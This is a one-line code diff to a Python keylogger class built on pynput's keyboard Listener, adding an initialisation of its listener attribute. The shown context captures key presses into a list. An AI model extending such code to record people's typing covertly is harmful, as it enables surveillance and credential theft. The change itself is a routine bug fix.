@@ -6,6 +6,7 @@ from pynput.keyboard import Key, Listener, KeyCode
 class KeyloggerService(IKeyLogger):
     def __init__(self):
         self.presses = list()
+        self.listener = None
 
     def start_logging(self) -> None:
         with Listener(on_press= self.press) as self.listener:
